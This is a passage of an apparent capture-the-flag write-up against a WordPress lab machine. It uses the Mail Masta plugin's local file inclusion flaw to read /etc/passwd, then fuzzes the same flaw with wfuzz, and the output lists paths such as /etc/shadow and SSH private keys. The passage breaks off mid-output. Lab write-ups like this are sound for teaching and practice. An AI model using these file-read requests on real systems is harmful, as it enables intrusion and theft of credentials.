 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6576
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6577
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6578
 |      - https://www.exploit-db.com/exploits/41438/
 |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.97.156/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 21

[+] Finished: Tue Apr 16 17:23:42 2024
[+] Requests Done: 8
[+] Cached Requests: 38
[+] Data Sent: 2.105 KB
[+] Data Received: 35.011 KB
[+] Memory used: 251.305 MB
[+] Elapsed time: 00:00:05
```

Let's check the Mail Masta LFI:

```bash
http://10.10.97.156/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

It works !!


```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false sshd:x:112:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
```

We can confirm there is a `elyana` user.

Let's try to fuzz this:

```bash
wfuzz -c -z file,/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hc 404,400 http://10.10.97.156/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=FUZZ 

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.97.156/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=FUZZ
Total requests: 880

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000015:   500        16 L     130 W      768 Ch      "/etc/crontab"                                                                                                                                                             
000000001:   500        32 L     42 W       1672 Ch     "/etc/passwd"                                                                                                                                                              
000000003:   500        0 L      0 W        0 Ch        "/etc/aliases"                                                                                                                                                             
000000046:   500        0 L      0 W        0 Ch        "/etc/modules.conf"                                                                                                                                                        
000000049:   500        0 L      0 W        0 Ch        "/etc/my.conf"                                                                                                                                                             
000000031:   500        0 L      0 W        0 Ch        "/etc/httpd/logs/access.log"                                                                                                                                               
000000050:   500        23 L     135 W      869 Ch      "/etc/mysql/my.cnf"                                                                                                                                                        
000000048:   500        0 L      0 W        0 Ch        "/etc/my.cnf"                                                                                                                                                              
000000047:   500        34 L     204 W      2475 Ch     "/etc/mtab"                                                                                                                                                                
000000007:   500        0 L      0 W        0 Ch        "/etc/at.allow"                                                                                                                                                            
000000044:   500        4 L      6 W        105 Ch      "/etc/lsb-release"                                                                                                                                                         
000000045:   500        0 L      0 W        0 Ch        "/etc/motd"                                                                                                                                                                
000000043:   500        0 L      0 W        0 Ch        "/etc/logrotate.d/vsftpd.log"                                                                                                                                              
000000042:   500        0 L      0 W        0 Ch        "/etc/logrotate.d/proftpd"                                                                                                                                                 
000000041:   500        0 L      0 W        0 Ch        "/etc/logrotate.d/ftp"                                                                                                                                                     
000000040:   500        0 L      0 W        0 Ch        "/etc/lilo.conf"                                                                                                                                                           
000000036:   500        0 L      0 W        0 Ch        "/etc/inetd.conf"                                                                                                                                                          
000000038:   500        2 L      5 W        26 Ch       "/etc/issue"                                                                                                                                                               
000000039:   500        0 L      0 W        0 Ch        "/etc/lighttpd.conf"                                                                                                                                                       
000000037:   500        0 L      0 W        0 Ch        "/etc/inittab"                                                                                                                                                             
000000034:   500        0 L      0 W        0 Ch        "/etc/httpd/php.ini"                                                                                                                                                       
000000035:   500        0 L      0 W        0 Ch        "/etc/httpd/srm.conf"                                                                                                                                                      
000000033:   500        0 L      0 W        0 Ch        "/etc/httpd/logs/error.log"                                                                                                                                                
000000030:   500        0 L      0 W        0 Ch        "/etc/httpd/logs/access_log"                                                                                                                                               
000000032:   500        0 L      0 W        0 Ch        "/etc/httpd/logs/error_log"                                                                                                                                                
000000029:   500        0 L      0 W        0 Ch        "/etc/httpd/httpd.conf"                                                                                                                                                    
000000028:   500        0 L      0 W        0 Ch        "/etc/httpd/conf/httpd.conf"                                                                                                                                               
000000027:   500        0 L      0 W        0 Ch        "/etc/httpd/access.conf"                                                                                                                                                   
000000025:   500        10 L     57 W       411 Ch      "/etc/hosts.allow"                                                                                                                                                         
000000026:   500        17 L     111 W      711 Ch      "/etc/hosts.deny"                                                                                                                                                          
000000024:   500        9 L      25 W       221 Ch      "/etc/hosts"                                                                                                                                                               
000000023:   500        0 L      0 W        0 Ch        "/etc/grub.conf"                                                                                                                                                           
000000022:   500        0 L      0 W        0 Ch        "/etc/groups"                                                                                                                                                              
000000020:   500        0 L      0 W        0 Ch        "/etc/ftpchroot"                                                                                                                                                           
000000021:   500        0 L      0 W        0 Ch        "/etc/ftphosts"                                                                                                                                                            
000000019:   500        0 L      0 W        0 Ch        "/etc/ftpaccess"                                                                                                                                                           
000000017:   500        0 L      0 W        0 Ch        "/etc/exports"                                                                                                                                                             
000000014:   500        0 L      0 W        0 Ch        "/etc/cron.deny"                                                                                                                                                           
000000016:   500        0 L      0 W        0 Ch        "/etc/cups/cupsd.conf"                                                                                                                                                     
000000018:   500        11 L     84 W       630 Ch      "/etc/fstab"                                                                                                                                                               
000000012:   500        0 L      0 W        0 Ch        "/etc/chttp.conf"                                                                                                                                                          
000000011:   500        0 L      0 W        0 Ch        "/etc/chrootUsers"                                                                                                                                                         
000000013:   500        0 L      0 W        0 Ch        "/etc/cron.allow"                                                                                                                                                          
000000009:   500        0 L      0 W        0 Ch        "/etc/bashrc"                                                                                                                                                              
000000010:   500        0 L      0 W        0 Ch        "/etc/bootptab"                                                                                                                                                            
000000006:   500        0 L      0 W        0 Ch        "/etc/apache2/httpd.conf"                                                                                                                                                  
000000008:   500        0 L      0 W        0 Ch        "/etc/at.deny"                                                                                                                                                             
000000004:   500        0 L      0 W        0 Ch        "/etc/anacrontab"                                                                                                                                                          
000000005:   200        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"                                                                                                                                                
000000002:   500        0 L      0 W        0 Ch        "/etc/shadow"                                                                                                                                                              
000000097:   500        0 L      0 W        0 Ch        "/logs/security_debug_log"                                                                                                                                                 
000000051:   500        4 L      16 W       90 Ch       "/etc/network/interfaces"                                                                                                                                                  
000000053:   500        0 L      0 W        0 Ch        "/etc/npasswd"                                                                                                                                                             
000000057:   500        0 L      0 W        0 Ch        "/etc/php4/cgi/php.ini"                                                                                                                                                    
000000065:   500        0 L      0 W        0 Ch        "/etc/php/php.ini"                                                                                                                                                         
000000081:   500        122 L    396 W      3264 Ch     "/etc/ssh/sshd_config"                                                                                                                                                     
000000100:   500        0 L      0 W        0 Ch        "/opt/xampp/etc/php.ini"                                                                                                                                                   
000000099:   500        0 L      0 W        0 Ch        "/opt/lampp/etc/httpd.conf"                                                                                                                                                
000000098:   500        0 L      0 W        0 Ch        "/logs/security_log"                                                                                                                                                       
000000096:   500        0 L      0 W        0 Ch        "/logs/pure-ftpd.log"                                                                                                                                                      
000000095:   500        0 L      0 W        0 Ch        "/etc/wu-ftpd/ftpusers"                                                                                                                                                    
000000093:   500        0 L      0 W        0 Ch        "/etc/wu-ftpd/ftpaccess"                                                                                                                                                   
000000094:   500        0 L      0 W        0 Ch        "/etc/wu-ftpd/ftphosts"                                                                                                                                                    
000000092:   500        0 L      0 W        0 Ch        "/etc/vsftpd/vsftpd.conf"                                                                                                                                                  
000000091:   200        155 L    951 W      5847 Ch     "/etc/vsftpd.conf"                                                                                                                                                         
000000090:   500        0 L      0 W        0 Ch        "/etc/vsftpd.chroot_list"                                                                                                                                                  
000000089:   500        0 L      0 W        0 Ch        "/etc/vhcs2/proftpd/proftpd.conf"                                                                                                                                          
000000088:   500        0 L      0 W        0 Ch        "/etc/termcap"                                                                                                                                                             
000000087:   500        0 L      0 W        0 Ch        "/etc/syslog.conf"                                                                                                                                                         
000000086:   500        0 L      0 W        0 Ch        "/etc/sysconfig/network"                                                                                                                                                   
000000082:   500        0 L      0 W        0 Ch        "/etc/ssh/ssh_host_dsa_key"                                                                                                                                                
000000085:   500        0 L      0 W        0 Ch        "/etc/ssh/ssh_host_key.pub"                                                                                                                                                
000000080:   500        51 L     218 W      1580 Ch     "/etc/ssh/ssh_config"                                                                                                                                                      
000000084:   500        0 L      0 W        0 Ch        "/etc/ssh/ssh_host_key"                                                                                                                                                    
000000083:   500        1 L      3 W        601 Ch      "/etc/ssh/ssh_host_dsa_key.pub"                                                                                                                                            
000000078:   500        0 L      0 W        0 Ch        "/etc/samba/smb.conf"                                                                                                                                                      
000000079:   500        0 L      0 W        0 Ch        "/etc/snmpd.conf"                                                                                                                                                          
000000077:   500        19 L     115 W      749 Ch      "/etc/resolv.conf"                                                                                                                                                         
000000076:   500        0 L      0 W        0 Ch        "/etc/redhat-release"                                                                                                                                                      
000000075:   500        0 L      0 W        0 Ch        "/etc/pure-ftpd/putreftpd.pdb"                                                                                                                                             
000000074:   500        0 L      0 W        0 Ch        "/etc/pure-ftpd/pure-ftpd.pdb"                                                                                                                                             
000000073:   500        0 L      0 W        0 Ch        "/etc/pure-ftpd/pure-ftpd.conf"                                                                                                                                            
000000070:   500        0 L      0 W        0 Ch        "/etc/pure-ftpd.conf"                                                                                                                                                      
000000072:   500        0 L      0 W        0 Ch        "/etc/pureftpd.pdb"                                                                                                                                                        
000000071:   500        0 L      0 W        0 Ch        "/etc/pureftpd.passwd"                                                                                                                                                     
000000068:   500        0 L      0 W        0 Ch        "/etc/proftp.conf"                                                                                                                                                         
000000069:   500        0 L      0 W        0 Ch        "/etc/proftpd/proftpd.conf"                                                                                                                                                
000000067:   500        27 L     97 W       581 Ch      "/etc/profile"                                                                                                                                                             
000000064:   500        0 L      0 W        0 Ch        "/etc/php/php4/php.ini"                                                                                                                                                    
000000066:   500        0 L      0 W        0 Ch        "/etc/printcap"                                                                                                                                                            
000000063:   500        0 L      0 W        0 Ch        "/etc/php.ini"                                                                                                                                                             
000000062:   500        0 L      0 W        0 Ch        "/etc/php/cgi/php.ini"                                                                                                                                                     
000000061:   500        0 L      0 W        0 Ch        "/etc/php/apache/php.ini"                                                                                                                                                  
000000060:   500        0 L      0 W        0 Ch        "/etc/php/apache2/php.ini"                                                                                                                                                 
000000059:   500        0 L      0 W        0 Ch        "/etc/php5/apache/php.ini"                                                                                                                                                 
000000052:   500        2 L      12 W       91 Ch       "/etc/networks"                                                                                                                                                            
000000058:   500        0 L      0 W        0 Ch        "/etc/php5/apache2/php.ini"                                                                                                                                                
000000055:   500        0 L      0 W        0 Ch        "/etc/php4/apache2/php.ini"                                                                                                                                                
000000056:   500        0 L      0 W        0 Ch        "/etc/php4/apache/php.ini"                                                                                                                                                 
000000054:   500        0 L      0 W        0 Ch        "/etc/php4.4/fcgi/php.ini"                                                                                                                                                 
000000101:   500        27 L     169 W      953 Ch      "/proc/cpuinfo"                                                                                                                                                            
000000103:   500        40 L     188 W      1773 Ch     "/proc/interrupts"                                                                                                                                                         
000000147:   500        0 L      0 W        0 Ch        "/usr/local/pureftpd/etc/pureftpd.pdn"                                                                                                                                     
000000115:   500        0 L      0 W        0 Ch        "/usr/lib/php/php.ini"                                                                                                                                                     
000000150:   500        0 L      0 W        0 Ch        "/usr/local/Zend/etc/php.ini"                                                                                                                                              
000000148:   500        0 L      0 W        0 Ch        "/usr/local/pureftpd/sbin/pure-config.pl"                                                                                                                                  
000000107:   500        34 L     204 W      2475 Ch     "/proc/mounts"                                                                                                                                                             
000000149:   500        0 L      0 W        0 Ch        "/usr/local/www/logs/httpd_log"                                                                                                                                            
000000131:   500        0 L      0 W        0 Ch        "/usr/local/etc/httpd/logs/access_log"                                                                                                                                     
000000146:   500        0 L      0 W        0 Ch        "/usr/local/pureftpd/etc/pure-ftpd.conf"                                                                                                                                   
000000145:   500        0 L      0 W        0 Ch        "/usr/local/php/lib/php.ini"                                                                                                                                               
000000144:   500        0 L      0 W        0 Ch        "/usr/local/php/httpd.conf.ini"                                                                                                                                            
000000142:   500        0 L      0 W        0 Ch        "/usr/local/php5/lib/php.ini"                                                                                                                                              
000000143:   500        0 L      0 W        0 Ch        "/usr/local/php/httpd.conf"                                                                                                                                                
000000141:   500        0 L      0 W        0 Ch        "/usr/local/php5/httpd.conf.php"                                                                                                                                           
000000140:   500        0 L      0 W        0 Ch        "/usr/local/php5/httpd.conf"                                                                                                                                               
000000139:   500        0 L      0 W        0 Ch        "/usr/local/php4/lib/php.ini"                                                                                                                                              
000000137:   500        0 L      0 W        0 Ch        "/usr/local/php4/httpd.conf"                                                                                                                                               
000000138:   500        0 L      0 W        0 Ch        "/usr/local/php4/httpd.conf.php"                                                                                                                                           
000000136:   500        0 L      0 W        0 Ch        "/usr/local/lib/php.ini"                                                                                                                                                   
000000135:   500        0 L      0 W        0 Ch        "/usr/local/etc/pureftpd.pdb"                                                                                                                                              
000000130:   500        0 L      0 W        0 Ch        "/usr/local/cpanel/logs/stats_log"                                                                                                                                         
000000134:   500        0 L      0 W        0 Ch        "/usr/local/etc/pure-ftpd.conf"                                                                                                                                            
000000133:   500        0 L      0 W        0 Ch        "/usr/local/etc/php.ini"                                                                                                                                                   
000000132:   500        0 L      0 W        0 Ch        "/usr/local/etc/httpd/logs/error_log"                                                                                                                                      
000000127:   500        0 L      0 W        0 Ch        "/usr/local/cpanel/logs/error_log"                                                                                                                                         
000000129:   500        0 L      0 W        0 Ch        "/usr/local/cpanel/logs/login_log"                                                                                                                                         
000000126:   500        0 L      0 W        0 Ch        "/usr/local/cpanel/logs/access_log"                                                                                                                                        
000000128:   500        0 L      0 W        0 Ch        "/usr/local/cpanel/logs/license_log"                                                                                                                                       
000000125:   500        0 L      0 W        0 Ch        "/usr/local/cpanel/logs"                                                                                                                                                   
000000124:   500        0 L      0 W        0 Ch        "/usr/local/apache/error.log"                                                                                                                                              
000000122:   500        0 L      0 W        0 Ch        "/usr/local/apache/audit_log"                                                                                                                                              
000000121:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs/access.log"                                                                                                                                        
000000123:   500        0 L      0 W        0 Ch        "/usr/local/apache/error_log"                                                                                                                                              
000000117:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/php.ini"                                                                                                                                           
000000119:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs"                                                                                                                                                   
000000114:   500        0 L      0 W        0 Ch        "/usr/lib/php.ini"                                                                                                                                                         
000000120:   500        0 L      0 W        0 Ch        "/usr/local/apache/logs/access_log"                                                                                                                                        
000000118:   500        0 L      0 W        0 Ch        "/usr/local/apache/log"                                                                                                                                                    
000000113:   500        0 L      0 W        0 Ch        "/usr/etc/pure-ftpd.conf"                                                                                                                                                  
000000116:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/modsec.conf"                                                                                                                                       
000000110:   500        1 L      17 W       152 Ch      "/proc/version"                                                                                                                                                            
000000109:   500        1 L      5 W        37 Ch       "/proc/swaps"                                                                                                                                                              
000000108:   500        9 L      998 W      2162 Ch     "/proc/stat"                                                                                                                                                               
000000102:   500        34 L     61 W       400 Ch      "/proc/filesystems"                                                                                                                                                        
000000106:   500        62 L     379 W      3300 Ch     "/proc/modules"                                                                                                                                                            
000000112:   500        0 L      0 W        0 Ch        "/root/anaconda-ks.cfg"                                                                                                                                                    
000000105:   500        47 L     137 W      1307 Ch     "/proc/meminfo"                                                                                                                                                            
000000111:   500        2 L      15 W       156 Ch      "/proc/self/net/arp"                                                                                                                                                       
000000151:   500        0 L      0 W        0 Ch        "/usr/sbin/pure-config.pl"                                                                                                                                                 
000000104:   500        41 L     139 W      1006 Ch     "/proc/ioports"                                                                                                                                                            
000000165:   500        0 L      0 W        0 Ch        "/var/log/apache/access.log"                                                                                                                                               
000000153:   500        0 L      0 W        0 Ch        "/var/apache2/config.inc"                                                                                                                                                  
000000200:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/lighttpd.error.log"                                                                                                                                     
000000199:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/lighttpd.access.log"                                                                                                                                    
000000181:   500        0 L      0 W        0 Ch        "/var/log/exim_paniclog"                                                                                                                                                   
000000197:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/access.log"                                                                                                                                             
000000157:   500        0 L      0 W        0 Ch        "/var/lib/mysql/my.cnf"                                                                                                                                                    
000000198:   500        0 L      0 W        0 Ch        "/var/log/lighttpd/error.log"                                                                                                                                              
000000195:   500        0 L      0 W        0 Ch        "/var/log/kern.log"                                                                                                                                                        
000000194:   500        0 L      0 W        0 Ch        "/var/log/httpsd/ssl_log"                                                                                                                                                  
000000192:   500        0 L      0 W        0 Ch        "/var/log/httpd/error.log"                                                                                                                                                 
000000191:   500        0 L      0 W        0 Ch        "/var/log/httpd/error_log"                                                                                                                                                 
000000188:   500        0 L      0 W        0 Ch        "/var/log/ftp-proxy/ftp-proxy.log"                                                                                                                                         
000000190:   500        0 L      0 W        0 Ch        "/var/log/httpd/access.log"                                                                                                                                                
000000187:   500        0 L      0 W        0 Ch        "/var/log/ftp-proxy"                                                                                                                                                       
000000189:   500        0 L      0 W        0 Ch        "/var/log/httpd/access_log"                                                                                                                                                
000000193:   500        0 L      0 W        0 Ch        "/var/log/httpsd/ssl.access_log"                                                                                                                                           
000000186:   500        0 L      0 W        0 Ch        "/var/log/ftplog"                                                                                                                                                          
000000184:   500        0 L      0 W        0 Ch        "/var/log/exim/rejectlog"                                                                                                                                                  
000000179:   500        0 L      0 W        0 Ch        "/var/log/exim_mainlog"                                                                                                                                                    
000000182:   500        0 L      0 W        0 Ch        "/var/log/exim.paniclog"                                                                                                                                                   
000000183:   500        0 L      0 W        0 Ch        "/var/log/exim_rejectlog"                                                                                                                                                  
000000180:   500        0 L      0 W        0 Ch        "/var/log/exim/mainlog"                                                                                                                                                    
000000177:   500        0 L      0 W        0 Ch        "/var/log/dmesg"                                                                                                                                                           
000000185:   200        0 L      1 W        32032 Ch    "/var/log/faillog"                                                                                                                                                         
000000176:   500        0 L      0 W        0 Ch        "/var/log/debug"                                                                                                                                                           
000000173:   500        0 L      0 W        0 Ch        "/var/log/chttp.log"                                                                                                                                                       
000000174:   500        0 L      0 W        0 Ch        "/var/log/cups/error.log"                                                                                                                                                  
000000170:   500        0 L      0 W        0 Ch        "/var/log/auth.log"                                                                                                                                                        
000000169:   500        0 L      0 W        0 Ch        "/var/log/apache-ssl/error.log"                                                                                                                                            
000000175:   500        0 L      0 W        0 Ch        "/var/log/daemon.log"                                                                                                                                                      
000000172:   500        0 L      0 W        0 Ch        "/var/htmp"                                                                                                                                                                
000000171:   500        0 L      0 W        0 Ch        "/var/log/boot"                                                                                                                                                            
000000168:   500        0 L      0 W        0 Ch        "/var/log/apache-ssl/access.log"                                                                                                                                           
000000163:   500        0 L      0 W        0 Ch        "/var/log/apache2/error.log"                                                                                                                                               
000000166:   500        0 L      0 W        0 Ch        "/var/log/apache/error_log"                                                                                                                                                
000000167:   500        0 L      0 W        0 Ch        "/var/log/apache/error.log"                                                                                                                                                
000000164:   500        0 L      0 W        0 Ch        "/var/log/apache/access_log"                                                                                                                                               
000000162:   500        0 L      0 W        0 Ch        "/var/log/apache2/error_log"                                                                                                                                               
000000160:   500        0 L      0 W        0 Ch        "/var/log/apache2/access_log"                                                                                                                                              
000000161:   500        0 L      0 W        0 Ch        "/var/log/apache2/access.log"                                                                                                                                              
000000159:   500        0 L      0 W        0 Ch        "/var/local/www/conf/php.ini"                                                                                                                                              
000000158:   500        0 L      0 W        0 Ch        "/var/lib/mysql/mysql/user.MYD"                                                                                                                                            
000000156:   500        0 L      0 W        0 Ch        "/var/cpanel/cpanel.config"                                                                                                                                                
000000203:   500        0 L      0 W        0 Ch        "/var/log/maillog"                                                                                                                                                         
000000154:   500        0 L      0 W        0 Ch        "/var/apache/logs/access_log"                                                                                                                                              
000000201:   500        0 L      0 W        0 Ch        "/var/log/mail.info"                                                                                                                                                       
000000152:   500        0 L      0 W        0 Ch        "/var/adm/log/xferlog"                                                                                                                                                     
000000155:   500        0 L      0 W        0 Ch        "/var/apache/logs/error_log"                                                                                                                                               
000000196:   200        0 L      10 W       292291 Ch   "/var/log/lastlog"                                                                                                                                                         
000000207:   500        0 L      0 W        0 Ch        "/var/log/mysqlderror.log"                                                                                                                                                 
000000245:   500        0 L      0 W        0 Ch        "~/.ssh/id_rsa"                                                                                                                                                            
000000231:   500        0 L      0 W        0 Ch        "~/.bash_history"                                                                                                                                                          
000000215:   500        0 L      0 W        0 Ch        "/var/log/secure"                                                                                                                                                          
000000246:   500        0 L      0 W        0 Ch        "~/.ssh/id_rsa.pub"                                                                                                                                                        
000000248:   500        0 L      0 W        0 Ch        "~/.ssh/id_ecdsa.pub"                                                                                                                                                      
000000250:   500        0 L      0 W        0 Ch        "~/.ssh/identity.pub"                                                                                                                                                      
000000249:   500        0 L      0 W        0 Ch        "~/.ssh/identity"                                                                                                                                                          
000000247:   500        0 L      0 W        0 Ch        "~/.ssh/id_ecdsa"                                                                                                                                                          
000000244:   500        0 L      0 W        0 Ch        "~/.ssh/id_dsa.pub"                                                                                                                                                        
000000243:   500        0 L      0 W        0 Ch        "~/.ssh/id_dsa"                                                                                                                                                            
000000236:   500        0 L      0 W        0 Ch        "~/.login"                                                                                                                                                                 
000000242:   500        0 L      0 W        0 Ch        "~/.ssh/authorized_keys"                                                                                                                                                   
000000239:   500        0 L      0 W        0 Ch        "~/.nano_history"                                                                                                                                                          
000000238:   500        0 L      0 W        0 Ch        "~/.mysql_history"                                                                                                                                                         
000000240:   500        0 L      0 W        0 Ch        "~/.php_history"                                                                                                                                                           
000000237:   500        0 L      0 W        0 Ch        "~/.logout"                                                                                                                                                                
000000241:   500        0 L      0 W        0 Ch        "~/.profile"                                                                                                                                                               
000000235:   500        0 L      0 W        0 Ch        "~/.gtkrc"                                                                                                                                                                 
000000234:   500        0 L      0 W        0 Ch        "~/.bashrc"                                                                                                                                                                
000000233:   500        0 L      0 W        0 Ch        "~/.bash_profile"                                                                                                                                                          
000000230:   500        0 L      0 W        0 Ch        "~/.atfp_history"                                                                                                                                                          
000000232:   500        0 L      0 W        0 Ch        "~/.bash_logout"                                                                                                                                                           
000000226:   500        0 L      0 W        0 Ch        "/var/www/logs/access_log"                                                                                                                                                 
000000228:   500        0 L      0 W        0 Ch        "/var/www/logs/access.log"                                                                                                                                                 
000000227:   500        0 L      0 W        0 Ch        "/var/www/logs/error_log"                                                                                                                                                  
000000229:   500        0 L      0 W        0 Ch        "/var/www/logs/error.log"                                                                                                                                                  
000000225:   500        0 L      0 W        0 Ch        "/var/www/log/error_log"                                                                                                                                                   
000000224:   500        0 L      0 W        0 Ch        "/var/www/log/access_log"                                                                                                                                                  
000000223:   500        0 L      0 W        0 Ch        "/var/webmin/miniserv.log"                                                                                                                                                 
000000219:   500        0 L      0 W        0 Ch        "/var/log/yum.log"                                                                                                                                                         
000000218:   500        0 L      0 W        0 Ch        "/var/log/xferlog"                                                                                                                                                         
000000222:   500        0 L      0 W        0 Ch        "/var/spool/cron/crontabs/root"                                                                                                                                            
000000221:   500        0 L      5 W        1536 Ch     "/var/run/utmp"                                                                                                                                                            
000000220:   500        0 L      0 W        0 Ch        "/var/mysql.log"                                                                                                                                                           
000000214:   500        0 L      0 W        0 Ch        "/var/log/pure-ftpd/pure-ftpd.log"                                                                                                                                         
000000213:   500        0 L      0 W        0 Ch        "/var/log/pureftpd.log"                                                                                                                                                    
000000217:   200        1 L      49 W       38013 Ch    "/var/log/wtmp"                                                                                                                                                            
000000212:   500        0 L      0 W        0 Ch        "/var/log/proftpd"                                                                                                                                                         
000000216:   500        0 L      0 W        0 Ch        "/var/log/vsftpd.log"                                                                                                                                                      
000000209:   500        0 L      0 W        0 Ch        "/var/log/mysql/mysql-bin.log"                                                                                                                                             
000000211:   500        0 L      0 W        0 Ch        "/var/log/mysql/mysql-slow.log"                                                                                                                                            
000000206:   500        0 L      0 W        0 Ch        "/var/log/messages"                                                                                                                                                        
000000210:   500        0 L      0 W        0 Ch        "/var/log/mysql/mysql.log"                                                                                                                                                 
000000178:   200        8028 L   47951 W    567419 Ch   "/var/log/dpkg.log"                                                                                                                                                        
000000208:   500        0 L      0 W        0 Ch        "/var/log/mysql.log"                                                                                                                                                       
000000202:   500        0 L      0 W        0 Ch        "/var/log/mail.log"                                                                                                                                                        
000000205:   500        0 L      0 W        0 Ch        "/var/log/message"                                                                                                                                                         
000000300:   500        0 L      0 W        0 Ch        "/etc/apache2/vhosts.d/00_default_vhost.conf"                                                                                                                              
000000257:   500        0 L      0 W        0 Ch        "/apache/conf/httpd.conf"                                                                                                                                                  
000000265:   500        0 L      0 W        0 Ch        "/etc/alias"                                                                                                                                                               
000000281:   500        5 L      18 W       157 Ch      "/etc/apache2/mods-available/dir.conf"                                                                                                                                     
000000204:   500        0 L      0 W        0 Ch        "/var/log/mail.warn"                                                                                                                                                       
000000251:   500        0 L      0 W        0 Ch        "~/.viminfo"                                                                                                                                                               
000000253:   500        0 L      0 W        0 Ch        "~/.Xdefaults"                                                                                                                                                             
000000298:   500        0 L      0 W        0 Ch        "/etc/apache2/sites-enabled/default"                                                                                                                                       
000000299:   500        0 L      0 W        0 Ch        "/etc/apache2/ssl-global.conf"                                                                                                                                             
000000297:   500        0 L      0 W        0 Ch        "/etc/apache2/sites-enabled/000-default"                                                                                                                                   
000000294:   500        15 L     46 W       320 Ch      "/etc/apache2/ports.conf"                                                                                                                                                  
000000296:   500        0 L      0 W        0 Ch        "/etc/apache2/sites-available/default-ssl"                                                                                                                                 
000000293:   500        29 L     102 W      749 Ch      "/etc/apache2/mods-enabled/status.conf"                                                                                                                                    
000000291:   500        20 L     124 W      724 Ch      "/etc/apache2/mods-enabled/negotiation.conf"                                                                                                                               
000000295:   500        0 L      0 W        0 Ch        "/etc/apache2/sites-available/default"                                                                                                                                     
000000292:   500        0 L      0 W        0 Ch        "/etc/apache2/mods-enabled/php5.conf"                                                                                                                                      
000000290:   200        251 L    1128 W     7676 Ch     "/etc/apache2/mods-enabled/mime.conf"                                                                                                                                      
000000288:   500        10 L     31 W       395 Ch      "/etc/apache2/mods-enabled/deflate.conf"                                                                                                                                   
000000279:   500        96 L     392 W      3374 Ch     "/etc/apache2/mods-available/autoindex.conf"                                                                                                                               
000000289:   500        5 L      18 W       157 Ch      "/etc/apache2/mods-enabled/dir.conf"                                                                                                                                       
000000285:   500        32 L     139 W      1280 Ch     "/etc/apache2/mods-available/setenvif.conf"                                                                                                                                
000000284:   500        27 L     139 W      822 Ch      "/etc/apache2/mods-available/proxy.conf"                                                                                                                                   
000000287:   500        24 L     131 W      843 Ch      "/etc/apache2/mods-enabled/alias.conf"                                                                                                                                     
000000286:   500        85 L     442 W      3110 Ch     "/etc/apache2/mods-available/ssl.conf"                                                                                                                                     
000000283:   200        251 L    1128 W     7676 Ch     "/etc/apache2/mods-available/mime.conf"                                                                                                                                    
000000280:   500        10 L     31 W       395 Ch      "/etc/apache2/mods-available/deflate.conf"                                                                                                                                 
000000282:   500        0 L      0 W        0 Ch        "/etc/apache2/mods-available/mem_cache.conf"                                                                                                                               
000000273:   500        0 L      0 W        0 Ch        "/etc/apache2/conf.d/phpmyadmin.conf"                                                                                                                                      
000000278:   500        0 L      0 W        0 Ch        "/etc/apache2/httpd2.conf"                                                                                                                                                 
000000276:   500        0 L      0 W        0 Ch        "/etc/apache2/default-server.conf"                                                                                                                                         
000000277:   500        47 L     227 W      1782 Ch     "/etc/apache2/envvars"                                                                                                                                                     
000000274:   500        0 L      0 W        0 Ch        "/etc/apache2/conf.d/security"                                                                                                                                             
